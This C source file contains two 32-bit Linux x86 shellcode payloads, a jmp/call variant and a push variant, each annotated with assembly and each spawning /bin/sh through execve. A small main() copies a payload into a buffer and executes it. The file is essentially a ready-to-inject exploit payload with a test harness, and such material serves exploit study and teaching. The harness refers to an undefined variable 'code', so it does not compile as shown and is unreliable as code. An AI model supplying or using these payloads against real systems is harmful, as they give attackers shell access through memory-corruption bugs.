#include <stdlib.h>
#include <stdio.h>

/* Linux execve jmp/call Style */
const char code_1[] =
	"\xeb\x14"				/* jmp		$0x16			*/
	"\x5b"					/* pop		%ebx			*/
	"\x31\xc0"				/* xor		%eax,%eax		*/
	"\x99"					/* cdq						*/
	"\x88\x43\x07"			/* mov		[%ebx+7],%al	*/
	"\x89\x5b\x08"			/* movl		[%ebx+8],%ebx	*/
	"\x89\x43\x0c"			/* movl		[%ebx+12],%eax	*/
	"\x8d\x4b\x08"			/* lea		%ecx,[%ebx+8]	*/
	"\xb0\x0b"				/* mov		%al,$0x0b		*/
	"\xcd\x80"				/* int		$0x80			*/
	"\xe8\xe7\xff\xff\xff"	/* call		$0x2			*/
	"/bin/sh"
;

/* Linux push execve Style */
const char code_2[] =
	"\x31\xc0"				/* xorl		%eax,%eax		*/
	"\x50"					/* pushl	%eax			*/
	"\x68""//sh"			/* pushl	$0x68732f2f		*/
	"\x68""/bin"			/* pushl	$0x6e69622f		*/
	"\x89\xe3"				/* movl		%esp,%ebx		*/
	"\x50"					/* pushl	%eax			*/
	"\x53"					/* pushl	%ebx			*/
	"\x89\xe1"				/* movl		%esp,%ecx		*/
	"\x99"					/* cdq						*/
	"\xb0\x0b"				/* movb		$0x0b,%al		*/
	"\xcd\x80"				/* int		$0x80			*/
;


int main(int argc, char **argv)
{
   char buf[sizeof(code)];
   strcpy(buf, code);
   ((void(*)( ))buf)( );
}
